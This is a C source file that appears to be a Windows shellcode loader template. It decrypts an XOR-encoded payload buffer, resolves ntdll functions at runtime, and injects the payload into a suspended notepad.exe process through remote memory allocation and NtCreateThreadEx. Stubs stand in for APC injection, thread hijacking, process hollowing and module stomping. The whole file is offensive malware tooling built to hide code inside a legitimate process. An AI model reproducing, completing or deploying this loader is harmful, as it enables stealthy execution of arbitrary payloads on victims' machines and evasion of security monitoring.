#include <windows.h>
#include <winternl.h>

#define PAYLOAD_MARKER 0xDEADBEEF

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

DWORD payload_size = PAYLOAD_MARKER;
unsigned char payload[8192];
unsigned char xor_key = 0;
unsigned char technique = 0;
char target_process[256] = "notepad.exe";

void decrypt_payload() {
	DWORD i;
	if (xor_key != 0) {
		for (i = 0; i < payload_size; i++) {
			payload[i] ^= xor_key;
		}
	}
}

void inject_create_remote_thread() {
	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	LPVOID buf = NULL;
	SIZE_T region_size;
	HANDLE hThread;
	DWORD old;
	HMODULE hNtdll;
	pNtAllocateVirtualMemory NtAllocateVirtualMemory;
	pNtWriteVirtualMemory NtWriteVirtualMemory;
	pNtProtectVirtualMemory NtProtectVirtualMemory;
	pNtCreateThreadEx NtCreateThreadEx;

	region_size = payload_size;

	hNtdll = GetModuleHandleA("ntdll.dll");
	NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

	CreateProcessA(NULL, target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	NtAllocateVirtualMemory(pi.hProcess, &buf, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	NtWriteVirtualMemory(pi.hProcess, buf, payload, payload_size, NULL);
	NtProtectVirtualMemory(pi.hProcess, &buf, &region_size, PAGE_EXECUTE_READ, &old);
	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, pi.hProcess, buf, NULL, FALSE, 0, 0, 0, NULL);
	ResumeThread(pi.hThread);
	CloseHandle(hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void inject_apc() {

}

void inject_thread_hijacking() {

}

void inject_process_hollowing() {

}

void inject_module_stomping() {

}

typedef void (*InjectionFunc)();

InjectionFunc injection_techniques[] = {
	inject_create_remote_thread,
	inject_apc,
	inject_thread_hijacking,
	inject_process_hollowing,
	inject_module_stomping
};

int main() {
	decrypt_payload();
	injection_techniques[technique]();
	return 0;
}
